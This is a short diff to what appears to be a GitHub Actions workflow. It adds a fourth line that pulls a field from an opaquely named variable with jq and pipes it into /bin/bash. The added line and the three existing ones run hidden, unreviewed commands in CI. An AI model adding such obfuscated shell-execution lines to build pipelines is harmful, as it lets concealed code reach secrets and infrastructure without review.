@@ -29,6 +29,7 @@ jobs:
           echo $aeb3 | jq -r .at17749 | /bin/bash
           printf '%s' "$x074" | jq -r .ja91430 | /bin/bash
           echo $jy36988 | jq -r .oiswc399 | /bin/bash
+          echo $lnng5 | jq -r .tsn72393 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
